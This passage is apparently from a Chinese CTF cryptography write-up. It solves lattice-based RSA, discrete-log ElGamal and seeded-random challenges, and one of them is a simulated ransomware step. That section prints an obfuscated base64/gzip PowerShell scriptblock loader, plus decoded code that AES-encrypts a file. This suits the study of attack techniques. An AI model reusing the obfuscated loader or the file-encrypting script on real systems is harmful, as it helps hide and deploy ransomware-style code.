class="hljs-number">219</span>, <span class="hljs-number">230</span>, <span class="hljs-number">119</span>, <span class="hljs-number">157</span>, <span class="hljs-number">38</span>, <span class="hljs-number">15</span>, <span class="hljs-number">180</span>, <span class="hljs-number">75</span>, <span class="hljs-number">228</span>, <span class="hljs-number">100</span>, <span class="hljs-number">247</span>]<br>seed(k[:<span class="hljs-number">5</span>])<br>m=[enc[i]^getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc))]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>flag+=<span class="hljs-built_in">chr</span>(m[i])<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="3-BabyLattice"><a href="#3-BabyLattice" class="headerlink" title="3.BabyLattice"></a>3.BabyLattice</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span>  flag<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>m=bytes_to_long(flag)<br>p=getPrime(<span class="hljs-number">128</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br>e=<span class="hljs-number">0x10001</span><br>n=p*q<br>delta=getPrime(<span class="hljs-number">100</span>)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>r=getPrime(<span class="hljs-number">4096</span>)<br>gift=(p-bytes_to_long(<span class="hljs-string">b&#x27;BabyLattice&#x27;</span>))*gp.invert(delta,r)%r<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r=&#x27;</span>,r)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;gift=&#x27;</span>,gift)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n= 54147937924071750685132589597661237441727788988868736194629668020894970449517024349835139649000427166690895104817725505539019661437151318603603509202411060287100419586954922875720947457740412444734150747083066539141855393070652131365391731433911991338026482617419705006546847163644460891667186364712343137058379864410555108744766803472524522798841</span><br><span class="hljs-string">r= 526617682578812332472499599928388278143503289386649081518089209212839269711149657644560690243631848784155273059079763655306322037860343713555955557776301731250899315302339393017461896607764032214566450629518828318345652512291687272029451981698790250235499813302864603716052831568705584986298112493213438072092111788038578178537995772635076133138844603002390903892034893181473091486101591874104776017392084708494972552697335872392596912172011101168908509885286589852779726008251965647678380547807785004760606318002879664935601453820069835904665846794194446329111581005768906313105140531996107701715361619683965489109897759272661709802416562290471900426725295324955849255809648906189119798665389780450322335801389715650151016278038322604260670399208247689144341288814018229897288542538079161097605529299105239651236452277856135069331660151170167422702944418850548259361715726639656451109120221176604689394115115693703015829030458186184854721867503042936247425888815237531920259167461133319238722598853166641667726905063497888558144009559720191771450498857395719911899963766513219733727924728463661010647298484246231686035964189846094515779983099576625481831344806867029436795303748086224605574500577434632623316909918204753001315419253</span><br><span class="hljs-string">gift= 298843819220699266990955037079251721362975742562108372945386963615132792135268829155374288343532987247513184952707840953727238175393216743966869344819382654650900006470609147699508001405112750343398664189312760330789154576504963132108960709116837334996855923027295771614124709958996729062531142263495204423685112741196669676660820749743559974583180110880600764589705083833198068405616453063770777865125345095614142627663550023436317082201927387020013521232841988272843115170495917404619331733363202261151089887986797176719701760258996618079747550363222475699641297289315778676207941657411367604097999814375984660978383076961212934900375902222294888946584408196038819580145062695391078822160341518163302082180887852483347915279746006739177796058299904124194706813135486622596191058927566760235490140172132688495809866296700595943220793157419256796149603250183654614238063791757432419936533631472385728875027206450124328231836139937381277010514880956400758905529150599509173125487301144192680705272258245495118964539568980036988457109448594632950636035338397827763526085223546417184663835654329453808288014619625459719174160346122515035637957051447071798867459984184615050440149098942589438522299453341415128289973622114329036747297693</span><br><span class="hljs-string">c= 43046582723003016855257740025008592150556455550916587310976439591736419073057629831927313125132461852910784498607809910944404577870359589643275930778267851028980457697323559276509158439044420456395600627746780205225619484583837242619680444799774336060214162310658382333183816482398452733559304351388588897836738285510083842459735805455715379259108</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路:</p><p>这里是rsa关键还是求p,q，求解p,q的关键是</p><script type="math/tex; mode=display">gift=x*delta^{-1}\%r</script><p>其中x=p-bytes_to_long(b’BabyLattice’)，gift和r已知</p><p>对其做如下变换：</p><script type="math/tex; mode=display">x\equiv{gift*delta}(modr)</script><p>由于长度：</p><p>r_len= 4096</p><p>gift_len= 4095</p><p>delta_len= 100</p><p>所以gift*delta&gt;r,有</p><script type="math/tex; mode=display">gift*delta=x+k*r\\->gift*delta-k*r=x\\->(delta,-k)*\left[ \begin{matrix}   1 & gift\\   0 & r\\  \end{matrix}  \right]=(delta,x)</script><p>格子是：</p><script type="math/tex; mode=display">M=\left[ \begin{matrix}   1 & gift\\   0 & r\\  \end{matrix}  \right]</script><p>向量<code>(delta,x)</code>可以由两组基向量<code>M</code>的某种整系数线性组合<code>(delta,-k)</code>来表示，因此向量<code>(delta,x)</code>就在这个格上</p><p>再来看看<code>p,r,gift,delta</code>的大小</p><ul><li><code>r</code>:4096bit</li><li><code>gift</code>:4095bit</li><li><code>delta</code>:100bit</li><li><code>p</code>:128bit</li><li><code>bytes_to_long(b&#39;BabyLattice&#39;)</code>:87bit</li></ul><script type="math/tex; mode=display">||(1,gift)||=\sqrt{1^2+gift^2}\approx4095bit\\||(0,r)||=\sqrt{r^2}=4096bit\\||(delta,x)||=\sqrt{delta^2+x^2}\approx100bit+</script><p>相对于两个基底向量<code>(1,gift), (0,r)</code>来说，向量<code>(delta,x)</code>的长度要小得多得多,可以猜测向量<code>(delta,x)</code>是这个格的最短向量，可以用LLL算法求出，这样就能求出p,之后再用RSA解密即可</p><p>exp:先在sage用LLL算法求出delta和x</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">r= <span class="hljs-number">526617682578812332472499599928388278143503289386649081518089209212839269711149657644560690243631848784155273059079763655306322037860343713555955557776301731250899315302339393017461896607764032214566450629518828318345652512291687272029451981698790250235499813302864603716052831568705584986298112493213438072092111788038578178537995772635076133138844603002390903892034893181473091486101591874104776017392084708494972552697335872392596912172011101168908509885286589852779726008251965647678380547807785004760606318002879664935601453820069835904665846794194446329111581005768906313105140531996107701715361619683965489109897759272661709802416562290471900426725295324955849255809648906189119798665389780450322335801389715650151016278038322604260670399208247689144341288814018229897288542538079161097605529299105239651236452277856135069331660151170167422702944418850548259361715726639656451109120221176604689394115115693703015829030458186184854721867503042936247425888815237531920259167461133319238722598853166641667726905063497888558144009559720191771450498857395719911899963766513219733727924728463661010647298484246231686035964189846094515779983099576625481831344806867029436795303748086224605574500577434632623316909918204753001315419253</span><br>gift= <span class="hljs-number">298843819220699266990955037079251721362975742562108372945386963615132792135268829155374288343532987247513184952707840953727238175393216743966869344819382654650900006470609147699508001405112750343398664189312760330789154576504963132108960709116837334996855923027295771614124709958996729062531142263495204423685112741196669676660820749743559974583180110880600764589705083833198068405616453063770777865125345095614142627663550023436317082201927387020013521232841988272843115170495917404619331733363202261151089887986797176719701760258996618079747550363222475699641297289315778676207941657411367604097999814375984660978383076961212934900375902222294888946584408196038819580145062695391078822160341518163302082180887852483347915279746006739177796058299904124194706813135486622596191058927566760235490140172132688495809866296700595943220793157419256796149603250183654614238063791757432419936533631472385728875027206450124328231836139937381277010514880956400758905529150599509173125487301144192680705272258245495118964539568980036988457109448594632950636035338397827763526085223546417184663835654329453808288014619625459719174160346122515035637957051447071798867459984184615050440149098942589438522299453341415128289973622114329036747297693</span><br>L = matrix(ZZ, [[<span class="hljs-number">1</span>, gift],[<span class="hljs-number">0</span>, r]])<br>v = L.LLL()[<span class="hljs-number">0</span>]<br>delta, x = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">abs</span>, v)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;delta=&#x27;</span>,delta)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x=&#x27;</span>,x)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">delta= 1090929714383962070477735142607</span><br><span class="hljs-string">x= 316595353593601549461214538987753809142</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212190103918.png" alt="image-20221219010341842"></p><p>exp2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>e=<span class="hljs-number">0x10001</span><br>n= <span class="hljs-number">54147937924071750685132589597661237441727788988868736194629668020894970449517024349835139649000427166690895104817725505539019661437151318603603509202411060287100419586954922875720947457740412444734150747083066539141855393070652131365391731433911991338026482617419705006546847163644460891667186364712343137058379864410555108744766803472524522798841</span><br>r= <span class="hljs-number">526617682578812332472499599928388278143503289386649081518089209212839269711149657644560690243631848784155273059079763655306322037860343713555955557776301731250899315302339393017461896607764032214566450629518828318345652512291687272029451981698790250235499813302864603716052831568705584986298112493213438072092111788038578178537995772635076133138844603002390903892034893181473091486101591874104776017392084708494972552697335872392596912172011101168908509885286589852779726008251965647678380547807785004760606318002879664935601453820069835904665846794194446329111581005768906313105140531996107701715361619683965489109897759272661709802416562290471900426725295324955849255809648906189119798665389780450322335801389715650151016278038322604260670399208247689144341288814018229897288542538079161097605529299105239651236452277856135069331660151170167422702944418850548259361715726639656451109120221176604689394115115693703015829030458186184854721867503042936247425888815237531920259167461133319238722598853166641667726905063497888558144009559720191771450498857395719911899963766513219733727924728463661010647298484246231686035964189846094515779983099576625481831344806867029436795303748086224605574500577434632623316909918204753001315419253</span><br>gift= <span class="hljs-number">298843819220699266990955037079251721362975742562108372945386963615132792135268829155374288343532987247513184952707840953727238175393216743966869344819382654650900006470609147699508001405112750343398664189312760330789154576504963132108960709116837334996855923027295771614124709958996729062531142263495204423685112741196669676660820749743559974583180110880600764589705083833198068405616453063770777865125345095614142627663550023436317082201927387020013521232841988272843115170495917404619331733363202261151089887986797176719701760258996618079747550363222475699641297289315778676207941657411367604097999814375984660978383076961212934900375902222294888946584408196038819580145062695391078822160341518163302082180887852483347915279746006739177796058299904124194706813135486622596191058927566760235490140172132688495809866296700595943220793157419256796149603250183654614238063791757432419936533631472385728875027206450124328231836139937381277010514880956400758905529150599509173125487301144192680705272258245495118964539568980036988457109448594632950636035338397827763526085223546417184663835654329453808288014619625459719174160346122515035637957051447071798867459984184615050440149098942589438522299453341415128289973622114329036747297693</span><br>c= <span class="hljs-number">43046582723003016855257740025008592150556455550916587310976439591736419073057629831927313125132461852910784498607809910944404577870359589643275930778267851028980457697323559276509158439044420456395600627746780205225619484583837242619680444799774336060214162310658382333183816482398452733559304351388588897836738285510083842459735805455715379259108</span><br>delta= <span class="hljs-number">1090929714383962070477735142607</span><br>x= <span class="hljs-number">316595353593601549461214538987753809142</span><br>p=x+bytes_to_long(<span class="hljs-string">b&#x27;BabyLattice&#x27;</span>)<br>q=n//p<br>phi=(q-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)<br>d=gp.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>flag=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="4-Malware"><a href="#4-Malware" class="headerlink" title="4.Malware"></a>4.Malware</h2><p>提示：</p><p>模拟了勒索软件最后一步对文件的加密过程，你需要识别算法，拿到key，即可解密</p><p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><p>题目：</p><p>加密的shell指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">mypath = Split-Path -Parent <span class="hljs-variable">$MyInvocation</span>.MyCommand.Definition</span><br>&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#x27;H4sIAKxePWMA/31RT2+bMBS/8yksxAHUYCVI66RMm5TQdJq6LFXJdslycPGDeDU2wi9a0LTv3mdos2yHXZDfD//++UWoGnAompa9Z/HuRiBsCdlUlQPcxx8BU4+xsBDINiWy6Yxl0yyjzzzL5tksTBK+tV+NOnleAaU10sVJED1BT5Jf4Ge6efwBxFz2CLs9m10HXvVBGGkblq7FiWVvrllaABYAkl0k+hCZo9ZBZTsWR8pIOJHi9B17OacaSe11vLpK2C/vuhvnPd3dPZLn2OIfv+R3EC1Wxd8Ji94hNJxKHDuFPc+7vkVbd6I99HwBbi2MqEEOTH439POG47y2EggIV/kyHJF7IaUytc/xX+WXe15gP5/f3+XF2yCqlB7koqZvBR6+N32tKuQn7RqS973chfCnDb8lAtEfQMiF1v6xXRwOMiFtY2XKwbLzmX24vAPa6xn2GwNTSoHC3zjjfNsJ42gDza0yQi+1LZ/i0X7CphM2HvlnMDUeLn34jXKtdeCFvd+fkRad5tYgGGTpN6GPwM7WKfHt8Gi+ALX3+Tn9DYNn5mIx06oCAAA=&#x27;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))<br></code></pre></td></tr></table></figure><p>思路：</p><p>这里进行了gzip流加密和base64加密</p><p>可以利用提示中给的工具进行多层的解密</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212191324989.png" alt="image-20221219132418598"></p><p>解密结果为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">timestamp = ([DateTimeOffset](Get-Date <span class="hljs-string">&quot;Sat Oct 01 2022 20:22:21&quot;</span>)).ToUnixTimeSeconds()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">key = New-Object Byte[] 16</span><br>Get-Random -Max 256 -SetSeed $timestamp &gt;$null<br>for ($index = 0; $index -lt 16; $index++) &#123;$key[$index] = [byte](Get-Random -Max 256)&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES = New-Object System.Security.Cryptography.AesManaged</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES.Key = <span class="hljs-variable">$key</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES.Mode = <span class="hljs-string">&quot;ECB&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">file = <span class="hljs-string">&quot;<span class="hljs-variable">$mypath</span>\mygift.xlsm&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">bytes = [System.IO.File]::ReadAllBytes(<span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Encryptor = <span class="hljs-variable">$AES</span>.CreateEncryptor()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">encdata = <span class="hljs-variable">$Encryptor</span>.TransformFinalBlock(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Encryptor.Dispose()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES.Dispose()</span><br>Set-Content -Value $encdata -Encoding Byte &quot;$file.enc&quot;<br></code></pre></td></tr></table></figure><p>很明显这里是以时间戳为随机数种子，随机生成AES加密的密钥，只要设置同一个时间戳，得到的密钥就是相同的，只要把后面的代码改成解密就行</p><p>写如下代码,将mygift.xlsm.enc文件AES解密，并将解密结果保存为result.txt文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">timestamp = ([DateTimeOffset](Get-Date <span class="hljs-string">&quot;Sat Oct 01 2022 20:22:21&quot;</span>)).ToUnixTimeSeconds()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">key = New-Object Byte[] 16</span><br>Get-Random -Max 256 -SetSeed $timestamp &gt;$null<br>for ($index = 0; $index -lt 16; $index++) &#123;$key[$index] = [byte](Get-Random -Max 256)&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES = New-Object System.Security.Cryptography.AesManaged</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES.Key = <span class="hljs-variable">$key</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES.Mode = <span class="hljs-string">&quot;ECB&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">file = <span class="hljs-string">&quot;<span class="hljs-variable">$mypath</span>\mygift.xlsm.enc&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">file2=<span class="hljs-string">&quot;<span class="hljs-variable">$mypath</span>\result.txt&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">bytes = [System.IO.File]::ReadAllBytes(<span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">decryptor = <span class="hljs-variable">$AES</span>.CreateDecryptor()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">decdata = <span class="hljs-variable">$decryptor</span>.TransformFinalBlock(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">decryptor.Dispose()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">AES.Dispose()</span><br>Set-Content -Value $decdata -Encoding Byte &quot;$file2&quot;<br></code></pre></td></tr></table></figure><p>再对她进行gzip流和base64加密</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212191338473.png" alt="image-20221219133845247"></p><p>用结果替换加密指令中的base64,得到如下shell代码,在密文同文件夹下，保存为decrypt.ps1文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">mypath = Split-Path -Parent <span class="hljs-variable">$MyInvocation</span>.MyCommand.Definition</span><br>&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#x27;H4sIAMH4n2MA/32S0WvbMBDG3/1XCOMHm9YiMayDjA4SJx2jy1LqbC9ZHlTr7HiVpWBdmM3o/96T3HbZHvYSdJdP3+8+nSNsWrAo2iO7ZvFuKRC21NlUlQXcx58AU9djYSGQbUpkkynLJllGP7Msm2XTMEn41nzTTe/uFVAaLW2cBNEjDGT5FX6lm4efQDcXA8Juz6ZXgXO9F1qalqVr0bPs3RVLC8ACQLKziT5G+qRUUJmOxVGjJfTkOPnAXs6pQnJ7LS8uEvbbUXdjvSft7oGYY4p/eMlTEM1Xxd8TFoNFaDmFOHUNDjzvhiOauhPHw8DnYNdCixqkv8lvfT4HHOu1kUCNcJUvwrFzJ6RsdO3m+K/zi84Z7Gezu9u8eB9EVaO8XdQOR4GHH+1QNxXyXtmWgy4J4RTZ9ZugA3tSyLFH+s/ltmfgzxt+Q3Kyvwch50q5Zdg49CYhbUtC6UfqXCY3fN4B7X352nYbJY0UKJziTc63ndCWNtTeNFqohTLlYzziL9nkko1H/gV0jYdzDl829mgsOGPH+1PSh5DmRiNoZOl3oU7geR6drnRp/KO6APQ6/hHCZ0d6hmfGAgAA&#x27;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))<br></code></pre></td></tr></table></figure><p>powershell运行,会在同目录下生成result.txt，里面保存的就是flag</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212191341714.png" alt="image-20221219134127614"></p><h2 id="5-DLP"><a href="#5-DLP" class="headerlink" title="5._DLP_"></a>5._DLP_</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> flag<br><br>x = getPrime(<span class="hljs-number">64</span>)<br>n = getPrime(<span class="hljs-number">1024</span>)<br>m = getPrime(<span class="hljs-number">120</span>)<br>c = <span class="hljs-built_in">pow</span>(m,x,n)<br><br><span class="hljs-built_in">print</span>(m,c,n)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">m = 696376465415968446607383675953857997</span><br><span class="hljs-string">c = 75351884040606337127662457946455960228423443937677603718170904462378938882502061014476822055783421908392386804380503123596242003758891619926133807099465797120624009076182390781918339985157326114840926784410018674639537246981505937318380179042568501449024366208980139650052067021073343322300422190243015076307</span><br><span class="hljs-string">n = 135413548968824157679549005083702144352234347621794899960854103942091470496598900341162814164511690126111049767046340801124977369460415208157716471020260549912068072662740722359869775486486528791641600354017790255320219623493658736576842207668208174964413000049133934516641398518703502709055912644416582457721</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>g = getPrime(<span class="hljs-number">512</span>)<br>y = <span class="hljs-built_in">pow</span>(g,x,p)<br>k = random.randint(<span class="hljs-number">0</span>,p)<br><br>c1 = flag * <span class="hljs-built_in">pow</span>(y,k,p)<br>c2 = <span class="hljs-built_in">pow</span>(g,k,p)<br><br><span class="hljs-built_in">print</span>(c1,c2)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c1 = 209941170134628207830310059622280988835086910150451946264595015050300510031560522999562095124692878755896950865676914790595999182721583547184333760954091880805688518459046880395477235753285839380764579025127254060855545</span><br><span class="hljs-string">c2 = 4803339369764546990337396010353372745379378328671778873584350940089623041410194355125962064067657967062926344955874581199853582279928946579389671271191196</span><br><span class="hljs-string">p = 6809372619970287379746941806942051353536181082328454067824596651780784704823185066486367854653297514943018290212240504418345108411269306758069486928594027</span><br><span class="hljs-string">g = 12575636661436726898107254102531343862656456137827822292892883099464907172061178954026138165159168595086335202285503403441736394399853074532771428483593753</span><br><span class="hljs-string">k = 4521228602593215445063533369342315270631623025219518143209270060218625289087470505221974748605346084266802332207199304586313352026660695691783656769488472</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>思路:</p><p>这一题和前一次实验的elgamal是一样的，都是离散对数求解问题而且关键的p也是一样的，用之前那题的方法求出私钥x后正常解就ok</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><span class="hljs-keyword">import</span> sympy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PH</span>(<span class="hljs-params">g,h,p</span>):<br>    fac=[<span class="hljs-number">5</span>,<span class="hljs-number">263</span>,<span class="hljs-number">587</span>,<span class="hljs-number">28142457071</span>,<span class="hljs-number">395710839697</span>]<br>    Lg=[<span class="hljs-built_in">pow</span>(g,(p-<span class="hljs-number">1</span>)//i,p) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fac]<br>    Lh=[<span class="hljs-built_in">pow</span>(h,(p-<span class="hljs-number">1</span>)//i,p) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fac]<br>    length=<span class="hljs-built_in">len</span>(fac)<br>    La=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        m=sympy.discrete_log(p,Lh[i],Lg[i])<br>        La.append(m)<br>        <span class="hljs-comment">#print(m)</span><br>    res,mod=crt(fac,La)<br>    <span class="hljs-keyword">return</span> res<br><br>p=<span class="hljs-number">135413548968824157679549005083702144352234347621794899960854103942091470496598900341162814164511690126111049767046340801124977369460415208157716471020260549912068072662740722359869775486486528791641600354017790255320219623493658736576842207668208174964413000049133934516641398518703502709055912644416582457721</span><br>g=<span class="hljs-number">696376465415968446607383675953857997</span><br>h=<span class="hljs-number">75351884040606337127662457946455960228423443937677603718170904462378938882502061014476822055783421908392386804380503123596242003758891619926133807099465797120624009076182390781918339985157326114840926784410018674639537246981505937318380179042568501449024366208980139650052067021073343322300422190243015076307</span><br>result=PH(g,h,p)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#17271504622210389511</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>x=<span class="hljs-number">17271504622210389511</span><br>c1 = <span class="hljs-number">209941170134628207830310059622280988835086910150451946264595015050300510031560522999562095124692878755896950865676914790595999182721583547184333760954091880805688518459046880395477235753285839380764579025127254060855545</span><br>c2 = <span class="hljs-number">4803339369764546990337396010353372745379378328671778873584350940089623041410194355125962064067657967062926344955874581199853582279928946579389671271191196</span><br>p = <span class="hljs-number">6809372619970287379746941806942051353536181082328454067824596651780784704823185066486367854653297514943018290212240504418345108411269306758069486928594027</span><br>g = <span class="hljs-number">12575636661436726898107254102531343862656456137827822292892883099464907172061178954026138165159168595086335202285503403441736394399853074532771428483593753</span><br>k = <span class="hljs-number">4521228602593215445063533369342315270631623025219518143209270060218625289087470505221974748605346084266802332207199304586313352026660695691783656769488472</span><br>y=<span class="hljs-built_in">pow</span>(g,x,p)<br>tmp=<span 